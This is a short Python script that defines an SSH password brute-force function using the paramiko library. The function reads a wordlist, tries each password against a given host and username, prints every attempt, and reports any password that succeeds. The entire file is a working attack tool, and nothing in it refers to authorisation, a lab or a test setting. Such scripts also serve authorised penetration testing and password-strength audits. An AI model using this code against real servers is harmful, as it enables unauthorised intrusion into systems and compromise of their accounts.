import paramiko
import os

def brute_force(host, username, wordlist_path):
    if not os.path.exists(wordlist_path):
        print(f"[-] Wordlist file '{wordlist_path}' not found.")
        return

    print(f"\n[+] Starting brute-force on {host} with username '{username}'")
    try:
        with open(wordlist_path, 'r') as file:
            for password in file:
                password = password.strip()
                if not password:
                    continue
                print(f"Trying password: {password}")
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    ssh.connect(host, username=username, password=password, timeout=3)
                    print(f"[SUCCESS] Password found: {password}")
                    ssh.close()
                    return
                except paramiko.AuthenticationException:
                    continue
                except Exception as e:
                    print(f"[ERROR] {e}")
                    break
        print("[-] No password found in wordlist.")
    except Exception as e:
        print(f"[ERROR] {e}")
